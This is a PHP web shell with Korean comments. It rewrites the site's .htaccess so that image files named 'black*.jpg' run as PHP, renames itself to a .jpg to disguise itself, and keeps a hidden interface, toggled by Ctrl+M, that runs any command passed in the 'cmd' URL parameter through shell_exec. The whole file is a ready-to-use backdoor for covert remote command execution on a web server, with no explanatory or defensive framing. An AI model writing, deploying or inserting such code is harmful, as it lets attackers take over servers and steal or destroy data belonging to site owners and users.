<?php
// 1. .htaccess 파일 수정(black이라고 적힌 jpg파일이 php의 역할을 할 수 있게 함)
$htaccess_path = __DIR__ . '/.htaccess';
$new_content = "<FilesMatch \"black.*\\.jpg$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n";

if (file_exists($htaccess_path)) {
    $existing_content = file_get_contents($htaccess_path);
    if (strpos($existing_content, $new_content) === false) {
        $updated_content = $existing_content . "\n" . $new_content;
        file_put_contents($htaccess_path, $updated_content);
    }
} else {
    file_put_contents($htaccess_path, $new_content);
}

// 2. 현재 파일 이름 변경(php가 적혀있는 확장자를 jpg로 변경)
$current_file = __FILE__;
$new_file = preg_replace('/\.php$/i', '.jpg', $current_file);

// 파일 이름 변경 시도
if ($current_file !== $new_file) {
    if (rename($current_file, $new_file)) {
        // 파일 이름 변경 성공 시 리다이렉트
        header("Location: " . basename($new_file));
        exit;
    } else {
        // 파일 이름 변경 실패 시 에러 출력
        echo "파일 이름 변경 실패!<br>";
        echo "현재 파일: $current_file<br>";
        echo "새 파일: $new_file<br>";
        exit;
    }
}

// 3. 숨겨진 명령어 실행 인터페이스
?>
<!DOCTYPE html>
<html lang="kr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #000;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            font-family: Arial, sans-serif;
        }
        #cmd-container {
            display: none;
        }
        pre {
            background-color: #111;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-size: 14px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div id="cmd-container">
        <h2>Command Result:</h2>
        <pre>
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo shell_exec($cmd); // 명령어 실행 결과 출력
}
?>
        </pre>
    </div>

    <script> 
        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey && event.key === 'm') {
                const cmdContainer = document.getElementById('cmd-container');
                cmdContainer.style.display = cmdContainer.style.display === 'none' ? 'block' : 'none';
            }
        });
    </script>
</body>
</html>
